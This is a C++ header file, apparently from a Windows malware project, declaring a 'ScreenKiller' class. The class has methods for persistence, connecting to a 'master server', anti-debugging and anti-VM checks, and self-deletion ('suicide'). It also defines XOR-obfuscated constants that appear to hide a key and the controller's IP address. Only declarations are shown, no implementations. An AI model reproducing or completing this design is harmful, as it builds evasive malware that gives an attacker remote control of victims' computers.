#pragma once

#include <windows.h>
#include <thread>
#include <string>

#define SCREEN_WIDTH	GetSystemMetrics(SM_CXSCREEN)
#define SCREEN_HEIGHT	GetSystemMetrics(SM_CYSCREEN)
#define DIVIDERS		5

#define MAX_FILE 256

#define XOR_KEY 55

#define ENCODED_KEY "\x5a\xa5\x12\x45\x47\x96\xfe\x7b\x4c\xdf\x05\x4e\x34\x59\x59\xda\xc6\x29\xae\xa5\x46\x0c\x41\x6b\xd1"
#define ENCODED_IP "\x2d\x5c\x09\x4c\x5d\x2f\x4d\x5c\x0e\x4b\x59\x0b\x7f\x05\x02\x52\x2c\x09\x43\x10\x56\x53\x11\x58\x52\x59\x05\x55\x5e\x1a\x6e\x5b\x0b\x46\x5a\x1a\x47"

class ScreenKiller
{
public:
	ScreenKiller();

	~ScreenKiller();

	void deploy();

	void suicide();

	void exit_if_debugged();

	std::string encrypt_string(const std::string& input_string) const;

	std::string encode_string(const std::string& input_string);

private:
	bool deploy_inner();

	bool get_persistency();

	bool connect_to_master_server();

	void exit_if_vm_cpuid();

	bool is_debugged1();

	bool is_debugged2();

	void check_secret_file();

	std::string decrypt_ip(std::string key);

	long long gcd(long long int a, long long int b);

	long long lcm(long long int a, long long int b);

	bool m_alive;
	bool m_persistent;
	bool m_connected;
	std::thread runner_thread;
};

typedef struct ScreenProps
{
	RECT rectScreen;
	HDC hdcScreen;
} ScreenProps, * PScreenProps;
